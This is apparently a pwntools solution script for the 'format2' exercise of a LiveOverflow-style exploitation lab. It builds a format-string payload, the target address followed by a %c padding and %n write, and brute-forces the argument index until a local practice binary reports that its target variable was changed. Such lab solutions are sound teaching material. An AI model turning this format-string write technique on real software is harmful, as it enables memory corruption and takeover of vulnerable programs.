#!/usr/bin/env python3

from __future__ import annotations

import sys
from pathlib import Path

from pwn import ELF, log, p32, process

sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402

SUCCESS = b"you have modified the target"

def try_idx(prog: str, target_addr: int, idx: int) -> bool:
    # Want target == 64.
    desired = 64
    already = 4  # bytes of p32(addr) before first '%'
    pad = desired - already
    if pad <= 0:
        pad = (desired - already) % 0x10000
        if pad == 0:
            pad = 1
    payload = p32(target_addr) + (f"%{pad}c%{idx}$n").encode() + b"\n"
    io = process([prog])
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=2)
    return SUCCESS in out

def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("format2"))
    elf = ELF(prog)
    tgt = elf.symbols.get("target")
    if not tgt:
        log.failure("target symbol not found")
        return 2

    for idx in range(1, 40):
        if try_idx(prog, tgt, idx):
            log.success("format2 solved (idx=%d)", idx)
            return 0
    log.failure("format2 failed in idx range")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
